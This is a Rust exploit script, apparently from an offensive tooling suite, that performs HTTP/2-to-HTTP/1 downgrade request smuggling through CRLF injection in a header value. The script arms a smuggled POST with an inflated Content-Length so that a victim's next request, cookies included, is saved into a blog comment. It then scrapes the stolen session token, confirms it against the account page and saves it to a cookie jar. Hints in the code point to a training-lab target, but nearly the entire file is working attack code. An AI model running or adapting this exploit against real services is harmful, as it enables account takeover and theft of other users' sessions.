#!/usr/bin/env rust-script
//! name: h2_crlf_capture
//! description: H2->H1 downgrade CRLF-injection capture driver - arms an HTTP/2 request whose last header value carries CRLF plus a smuggled `POST <sink>` WITH an over-long Content-Length, HOLDS the client connection open (the front-end pins an upstream connection to it; closing the client connection aborts the hungry smuggled request), stays silent for one victim cycle so the victim's next request bytes land in the comment body, then reads the sink and reports the stolen session, verifying it against an account page and writing an http_session jar. --diag-probe cross-checks whether that upstream is shared with another client connection.
//! version: 1.2.0
//! args: <base-url> [--post-id 1] [--sink PATH] [--overshoot N] [--overshoots a,b,c] [--rounds N] [--burst N] [--arm-gap-ms N] [--gap-secs N] [--read-ms N] [--token S] [--session S] [--verify-path /my-account] [--diag-probe PATH] [--own-window] [--out JAR]
//! keywords: 漏洞猎手套件, h2, http2, crlf, injection, downgrade, request-smuggling, victim-capture, session-theft, comment-sink, hpack
//!
//! ```cargo
//! [dependencies]
//! tokio = { version = "1", features = ["rt-multi-thread", "net", "io-util", "time", "macros"] }
//! tokio-rustls = "0.26"
//! rustls = { version = "0.23", default-features = false, features = ["ring", "logging", "std", "tls12"] }
//! webpki-roots = "0.26"
//! hpack = "0.3"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::client::TlsStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{ClientConfig, RootCertStore};
use tokio_rustls::TlsConnector;
use url::Url;

const PREFACE: &[u8] = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

struct Opts {
    host: String,
    port: u16,
    post_id: u64,
    sink: String,
    overshoot: usize,
    overshoots: Vec<usize>,
    rounds: u32,
    burst: u32,
    arm_gap_ms: u64,
    gap_secs: u64,
    read_ms: u64,
    token: Option<String>,
    session: Option<String>,
    verify_path: String,
    diag_probe: Option<String>,
    fill_probe: u32,
    hold: bool,
    own_window: bool,
    out: Option<String>,
}

#[tokio::main]
async fn main() {
    // rustls 0.23 在 ring+aws-lc 双 provider feature 并存时不自动选,显式装
    // ring 为进程默认,幂等。
    let _ = rustls::crypto::ring::default_provider().install_default();

    let args: Vec<String> = std::env::args().skip(1).collect();
    let mut base = String::new();
    let mut post_id = 1u64;
    let mut sink: Option<String> = None;
    let mut overshoot = 820usize;
    let mut overshoots: Vec<usize> = Vec::new();
    let mut rounds = 4u32;
    let mut burst = 1u32;
    let mut arm_gap_ms = 400u64;
    let mut gap_secs = 20u64;
    let mut read_ms = 1200u64;
    let mut token: Option<String> = None;
    let mut session: Option<String> = None;
    let mut verify_path = "/my-account".to_string();
    let mut diag_probe: Option<String> = None;
    let mut fill_probe = 0u32;
    let mut hold = false;
    let mut own_window = false;
    let mut out: Option<String> = None;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--post-id" => {
                i += 1;
                post_id = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(post_id);
            }
            "--sink" => {
                i += 1;
                sink = args.get(i).cloned();
            }
            "--overshoot" => {
                i += 1;
                overshoot = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(overshoot);
            }
            "--overshoots" => {
                i += 1;
                overshoots = args
                    .get(i)
                    .map(|v| v.split(',').filter_map(|x| x.trim().parse::<usize>().ok()).collect())
                    .unwrap_or_default();
            }
            "--rounds" => {
                i += 1;
                rounds = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(rounds).max(1);
            }
            "--burst" => {
                i += 1;
                burst = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(burst).max(1);
            }
            "--arm-gap-ms" => {
                i += 1;
                arm_gap_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(arm_gap_ms);
            }
            "--gap-secs" => {
                i += 1;
                gap_secs = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(gap_secs);
            }
            "--read-ms" => {
                i += 1;
                read_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(read_ms);
            }
            "--token" => {
                i += 1;
                token = args.get(i).cloned();
            }
            "--session" => {
                i += 1;
                session = args.get(i).cloned();
            }
            "--verify-path" => {
                i += 1;
                verify_path = args.get(i).cloned().unwrap_or(verify_path);
            }
            "--fill-probe" => {
                i += 1;
                fill_probe = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(fill_probe);
            }
            "--diag-probe" => {
                i += 1;
                diag_probe = args.get(i).cloned();
            }
            "--hold" => hold = true,
            "--own-window" => own_window = true,
            "--out" => {
                i += 1;
                out = args.get(i).cloned();
            }
            other if !other.starts_with("--") && base.is_empty() => base = other.to_string(),
            _ => {}
        }
        i += 1;
    }

    if base.is_empty() {
        pi_rust_lib::report::failure("h2_crlf_capture", "missing base url", "call as: h2_crlf_capture <base-url> [--post-id 1]");
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = parsed.host_str().unwrap_or("").to_string();
    let o = Opts {
        host,
        port: parsed.port().unwrap_or(443),
        post_id,
        sink: sink.unwrap_or_else(|| format!("/post?postId={post_id}")),
        overshoot,
        overshoots,
        rounds,
        burst,
        arm_gap_ms,
        gap_secs,
        read_ms,
        token,
        session,
        verify_path,
        diag_probe,
        fill_probe,
        hold,
        own_window,
        out,
    };
    let deadline: f64 = std::env::var("PI_TIMEOUT_SECS").ok().and_then(|v| v.parse().ok()).unwrap_or(300.0);
    match tokio::time::timeout(Duration::from_secs_f64(deadline), run(&o)).await {
        Ok(Ok(data)) => {
            pi_rust_lib::report::success(
                "h2_crlf_capture",
                data,
                "captured session -> http_session with the written jar to confirm the account page and the solved banner",
            )
            .unwrap_or(());
        }
        Ok(Err(e)) => {
            pi_rust_lib::report::failure("h2_crlf_capture", &e, "check base url / sink path / csrf token availability");
            std::process::exit(1);
        }
        Err(_) => {
            pi_rust_lib::report::failure("h2_crlf_capture", &format!("deadline {deadline}s reached"), "raise PI_TIMEOUT_SECS or lower --rounds");
            std::process::exit(1);
        }
    }
}

fn tls_config(alpn: &[&[u8]]) -> Arc<ClientConfig> {
    let mut roots = RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut cfg = ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    cfg.alpn_protocols = alpn.iter().map(|p| p.to_vec()).collect();
    Arc::new(cfg)
}

fn frame(ftype: u8, flags: u8, stream: u32, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut out = Vec::with_capacity(9 + len);
    out.push((len >> 16) as u8);
    out.push((len >> 8) as u8);
    out.push(len as u8);
    out.push(ftype);
    out.push(flags);
    out.push((stream >> 24) as u8);
    out.push((stream >> 16) as u8);
    out.push((stream >> 8) as u8);
    out.push(stream as u8);
    out.extend_from_slice(payload);
    out
}

async fn tls_connect(cfg: Arc<ClientConfig>, host: &str, port: u16) -> Result<TlsStream<TcpStream>, String> {
    let connector = TlsConnector::from(cfg);
    let sn = ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
    connector.connect(sn, tcp).await.map_err(|e| format!("tls: {e}"))
}

/// Plain HTTP/1.1 GET over TLS with Connection: close; returns (status, body, set-cookie lines).
async fn http1_get(cfg: Arc<ClientConfig>, host: &str, port: u16, path: &str, cookie: Option<&str>) -> Result<(u16, String, Vec<String>), String> {
    let mut tls = tls_connect(cfg, host, port).await?;
    let mut req = format!("GET {path} HTTP/1.1\r\nHost: {host}\r\nAccept: */*\r\nConnection: close\r\n");
    if let Some(c) = cookie {
        req.push_str(&format!("Cookie: {c}\r\n"));
    }
    req.push_str("\r\n");
    tls.write_all(req.as_bytes()).await.map_err(|e| format!("write: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    let mut buf = Vec::new();
    let _ = tokio::time::timeout(Duration::from_secs(15), tls.read_to_end(&mut buf)).await;
    let text = String::from_utf8_lossy(&buf).to_string();
    let (head, body) = match text.split_once("\r\n\r\n") {
        Some((h, b)) => (h.to_string(), b.to_string()),
        None => (text.clone(), String::new()),
    };
    let status = head
        .lines()
        .next()
        .and_then(|l| l.split_whitespace().nth(1))
        .and_then(|s| s.parse::<u16>().ok())
        .unwrap_or(0);
    let set_cookies: Vec<String> = head
        .lines()
        .filter(|l| l.to_ascii_lowercase().starts_with("set-cookie:"))
        .map(|l| l[11..].trim().to_string())
        .collect();
    Ok((status, body, set_cookies))
}

/// One h2 arm: GET / with a final header whose VALUE carries CRLFCRLF + the smuggled
/// request. Returns the STILL-OPEN stream plus the stream-1 response summary - the
/// front-end ties its upstream connection to this client connection, so the caller
/// must keep it alive until the hungry body has been filled.
async fn arm_open(cfg: Arc<ClientConfig>, host: &str, port: u16, injected: &str, read_ms: u64) -> Result<(TlsStream<TcpStream>, Value), String> {
    let mut tls = tls_connect(cfg, host, port).await?;
    tls.write_all(PREFACE).await.map_err(|e| format!("preface: {e}"))?;
    tls.write_all(&frame(4, 0, 0, &[])).await.map_err(|e| format!("settings: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;

    let headers: Vec<(Vec<u8>, Vec<u8>)> = vec![
        (b":method".to_vec(), b"GET".to_vec()),
        (b":scheme".to_vec(), b"https".to_vec()),
        (b":authority".to_vec(), host.as_bytes().to_vec()),
        (b":path".to_vec(), b"/".to_vec()),
        (b"x-arm".to_vec(), injected.as_bytes().to_vec()),
    ];
    let block = hpack::Encoder::new().encode(headers.iter().map(|(n, v)| (n.as_slice(), v.as_slice())));
    tls.write_all(&frame(1, 0x5, 1, &block)).await.map_err(|e| format!("headers: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;

    let mut status: Option<String> = None;
    let mut body_len = 0usize;
    let mut dec = hpack::Decoder::new();
    let idle = Duration::from_millis(read_ms.max(200));
    loop {
        let mut hdr = [0u8; 9];
        match tokio::time::timeout(idle, tls.read_exact(&mut hdr)).await {
            Err(_) => break,
            Ok(Err(_)) => break,
            Ok(Ok(_)) => {}
        }
        let len = ((hdr[0] as usize) << 16) | ((hdr[1] as usize) << 8) | hdr[2] as usize;
        let ftype = hdr[3];
        let flags = hdr[4];
        let sid = u32::from_be_bytes([hdr[5] & 0x7f, hdr[6], hdr[7], hdr[8]]);
        let mut payload = vec![0u8; len];
        if len > 0 && tokio::time::timeout(idle, tls.read_exact(&mut payload)).await.is_err() {
            break;
        }
        let mut end_stream = false;
        match ftype {
            4 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(4, 0x1, 0, &[])).await;
                    let _ = tls.flush().await;
                }
            }
            6 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(6, 0x1, 0, &payload)).await;
                    let _ = tls.flush().await;
                }
            }
            1 => {
                if sid == 1 {
                    if flags & 0x1 != 0 {
                        end_stream = true;
                    }
                    if let Ok(hs) = dec.decode(&payload) {
                        for (n, v) in hs {
                            if n == b":status" {
                                status = Some(String::from_utf8_lossy(&v).to_string());
                            }
                        }
                    }
                }
            }
            0 => {
                if sid == 1 {
                    body_len += payload.len();
                    if flags & 0x1 != 0 {
                        end_stream = true;
                    }
                }
            }
            _ => {}
        }
        if end_stream && status.is_some() {
            break;
        }
    }
    let info = json!({"stream1_status": status, "stream1_body_len": body_len});
    Ok((tls, info))
}

fn alnum_run_after(page: &str, byte_idx: usize) -> String {
    let mut out = String::new();
    for c in page[byte_idx..].chars() {
        if c.is_ascii_alphanumeric() || c == '-' || c == '_' {
            out.push(c);
        } else {
            break;
        }
    }
    out
}

fn cookie_value(set_cookie: &str, name: &str) -> Option<String> {
    let needle = format!("{name}=");
    let idx = set_cookie.find(&needle)?;
    let v = alnum_run_after(set_cookie, idx + needle.len());
    if v.is_empty() {
        None
    } else {
        Some(v)
    }
}

fn extract_csrf(html: &str) -> Option<String> {
    let idx = html.find("name=\"csrf\" value=\"")? + "name=\"csrf\" value=\"".len();
    let mut out = String::new();
    for c in html[idx..].chars() {
        if c == '"' {
            break;
        }
        out.push(c);
    }
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}

fn window(page: &str, idx: usize, back: usize, fwd: usize) -> String {
    let mut start = idx.saturating_sub(back);
    while start < page.len() && !page.is_char_boundary(start) {
        start += 1;
    }
    let mut end = (idx + fwd).min(page.len());
    while end > start && !page.is_char_boundary(end) {
        end -= 1;
    }
    page[start..end].to_string()
}

/// Every `session=<alnum>` value in the page except the caller's own.
fn scan_sessions(page: &str, self_session: &str) -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = Vec::new();
    for (idx, _) in page.match_indices("session=") {
        let v = alnum_run_after(page, idx + "session=".len());
        if v.len() < 16 || v == self_session {
            continue;
        }
        if out.iter().any(|(x, _)| *x == v) {
            continue;
        }
        out.push((v, window(page, idx, 160, 420)));
    }
    out
}

async fn run(o: &Opts) -> Result<Value, String> {
    let h1 = tls_config(&[b"http/1.1"]);
    let h2 = tls_config(&[b"h2"]);

    // Seed material: the sink page's own session + csrf, so the smuggled comment
    // passes the writer's checks even from a fresh client.
    let (seed_status, seed_body, set_cookies) = http1_get(h1.clone(), &o.host, o.port, &o.sink, None).await?;
    let mut session = o.session.clone().unwrap_or_default();
    if session.is_empty() {
        session = set_cookies.iter().find_map(|c| cookie_value(c, "session")).unwrap_or_default();
    }
    let token = match o.token.clone().or_else(|| extract_csrf(&seed_body)) {
        Some(t) => t,
        None => return Err(format!("no csrf token on {} (status {seed_status})", o.sink)),
    };
    if session.is_empty() {
        return Err("no session cookie for the smuggled comment request; pass --session".to_string());
    }

    let base_body = format!(
        "csrf={token}&postId={}&name=capture&email=capture%40arm.test&website=http%3A%2F%2Fcapture.test&comment=",
        o.post_id
    );
    let mut rows: Vec<Value> = Vec::new();
    let mut diag: Option<Value> = None;
    let mut captured: Option<Value> = None;

    // Diagnostic: arm one hungry request, keep the client connection open, and probe
    // from a SECOND client connection - does that foreign request complete the body?
    if let Some(probe_path) = &o.diag_probe {
        let marker = "%23diag%23";
        let provided = format!("{base_body}{marker}");
        let cl = provided.len() + 4 + o.overshoot;
        let smuggled = format!(
            "POST {} HTTP/1.1\r\nHost: {}\r\nCookie: session={}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {cl}\r\n\r\n{provided}",
            o.sink, o.host, session
        );
        let injected = format!("x\r\n\r\n{smuggled}");
        let (held, arm_info) = arm_open(h2.clone(), &o.host, o.port, &injected, o.read_ms).await?;
        drop(held);
        // Silent window first: if the victim's own traffic reaches this armed
        // connection, it lands inside the comment body before any byte of ours does.
        tokio::time::sleep(Duration::from_secs(o.gap_secs)).await;
        let mut probes: Vec<Value> = Vec::new();
        for k in 1..=o.fill_probe {
            let (pst, pbody, _) = http1_get(h1.clone(), &o.host, o.port, &format!("{probe_path}{k}"), None).await?;
            probes.push(json!({"k": k, "status": pst, "served_normally": pbody.contains("LAB_HEADER_START")}));
            tokio::time::sleep(Duration::from_secs(1)).await;
        }
        tokio::time::sleep(Duration::from_secs(3)).await;
        let (sst, page, _) = http1_get(h1.clone(), &o.host, o.port, &o.sink, None).await?;
        let mark = marker.trim_start_matches("\r\n");        let mpos = page.find(mark).unwrap_or(0);
        let marker_comment = window(&page, mpos, 220, 1400);
        let probe_offset = marker_comment.find("PROBEPROBE").map(|v| v as i64).unwrap_or(-1);
        diag = Some(json!({
            "content_length": cl,
            "provided_body": provided.len(),
            "arm": arm_info,
            "silent_secs": o.gap_secs,
            "probes": probes,
            "probe_path": probe_path,
            "sink_status": sst,
            "marker_present": page.contains(mark),
            // bytes between our marker and the first probe text = foreign traffic
            "foreign_bytes_before_probe": probe_offset,
            "marker_comment": marker_comment,
            "session_candidates": scan_sessions(&page, &session).iter().map(|(v, _)| v.clone()).collect::<Vec<_>>(),
        }));
    }

    if diag.is_none() {
        // A sweep plans one arm per overhang: the capture is the FIRST N bytes of the
        // comment body, so N must stay under the victim's request length (one visit
        // completes the body) while reaching past its Cookie header.
        let plan: Vec<usize> = if o.overshoots.is_empty() {
            vec![o.overshoot; o.rounds as usize]
        } else {
            o.overshoots.clone()
        };
        for (idx, over) in plan.iter().enumerate() {
            let round = (idx + 1) as u32;
            let over = *over;
            let mut marks: Vec<Value> = Vec::new();
            // --hold keeps the arm's client connection alive across the quiet window:
            // the front-end only routes other traffic into that upstream connection
            // while the client connection that owns it is still open.
            let mut held: Vec<TlsStream<TcpStream>> = Vec::new();
            // Burst: one hungry pending per client connection. The arm connection is
            // DROPPED at once - the front-end only returns the pinned upstream
            // connection to the shared idle pool when its client connection goes away,
            // and that pool is where the victim's own requests land.
            for b in 1..=o.burst {
                // The marker rides inside the comment VALUE: a raw CRLF right
                // after `comment=` makes the writer reject the whole POST.
                let marker = format!("%23r{round}.{b}%23");
                let provided = format!("{base_body}{marker}");
                // CL covers the bytes we supply, the front-end's own trailing bytes
                // (CRLF + `Content-Length: 0` + CRLF = 23) and an overhang that only
                // later traffic can fill.
                let cl = provided.len() + 23 + over;
                let smuggled = format!(
                    "POST {} HTTP/1.1\r\nHost: {}\r\nCookie: session={}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {cl}\r\n\r\n{provided}",
                    o.sink, o.host, session
                );
                let injected = format!("x\r\n\r\n{smuggled}");
                match arm_open(h2.clone(), &o.host, o.port, &injected, o.read_ms).await {
                    Ok((conn, info)) => {
                        if o.hold {
                            held.push(conn);
                        } else {
                            drop(conn);
                        }
                        marks.push(json!({"burst": b, "content_length": cl, "provided_body": provided.len(), "arm": info}));
                    }
                    Err(e) => marks.push(json!({"burst": b, "error": e})),
                }
                if b < o.burst {
                    tokio::time::sleep(Duration::from_millis(o.arm_gap_ms)).await;
                }
            }
            // Quiet window: zero traffic from us, so the overhang can only be
            // completed by the victim's own next request.
            tokio::time::sleep(Duration::from_secs(o.gap_secs)).await;
            // The first read can itself be fed into a still-hungry sibling connection
            // and come back mispaired; retry so an already-stored comment is seen.
            let mut sink_status = 0u16;
            let mut hits: Vec<(String, String)> = Vec::new();
            let mut marker_comment = String::new();
            let mut reads = 0u32;
            let mark = format!("#r{round}.1#");
            while reads < 3 {
                reads += 1;
                let (st, page, _) = http1_get(h1.clone(), &o.host, o.port, &o.sink, None).await?;
                sink_status = st;
                marker_comment = window(&page, page.find(&mark).unwrap_or(0), 60, over + 400);
                // Session candidates must come from THIS round's captured comment
                // window: older comments in the sink are other runs' captured bytes
                // (and dead sessions), and matching them aborts the run on a fossil
                // instead of waiting for a live capture.
                hits = if o.own_window {
                    scan_sessions(&marker_comment, &session)
                } else {
                    scan_sessions(&page, &session)
                };
                if !hits.is_empty() || (st == 200 && page.contains("Comments")) {
                    break;
                }
                tokio::time::sleep(Duration::from_secs(2)).await;
            }
            rows.push(json!({
                "round": round,
                "overshoot": over,
                "held": held.len(),
                "arms": marks,
                "sink_status": sink_status,
                "sink_reads": reads,
                "marker_stored": marker_comment.contains("#r"),
                "marker_comment": marker_comment,
                "session_candidates": hits.iter().map(|(v, _)| v.clone()).collect::<Vec<_>>(),
            }));
            drop(held);
            if let Some((value, ctx)) = hits.first() {
                captured = Some(json!({"round": round, "session": value, "context": ctx}));
                break;
            }
        }
    }

    let mut verdict = json!({"verified": false});
    let mut jar_path: Option<String> = None;
    if let Some(cap) = &captured {
        let stolen = cap["session"].as_str().unwrap_or("").to_string();
        if let Ok((st, body, _)) = http1_get(h1.clone(), &o.host, o.port, &o.verify_path, Some(&format!("session={stolen}"))).await {
            let signed_in = body.contains("Log out") || body.contains("Your username is");
            verdict = json!({
                "verified": signed_in,
                "verify_path": o.verify_path,
                "verify_status": st,
                "account_snippet": window(&body, body.find("Your username is").unwrap_or(0), 0, 260),
            });
        }
        jar_path = o.out.clone();
        if let Some(p) = &jar_path {
            let jar = json!({ o.host.clone(): { "session": stolen } });
            let _ = std::fs::write(p, jar.to_string());
        }
    }

    Ok(json!({
        "host": o.host,
        "sink": o.sink,
        "overshoot": o.overshoot,
        "burst": o.burst,
        "quiet_secs": o.gap_secs,
        "diag": diag,
        "rounds_run": rows.len(),
        "rounds": rows,
        "captured": captured,
        "verdict": verdict,
        "jar": jar_path,
        "session_used_for_smuggle": session,
    }))
}
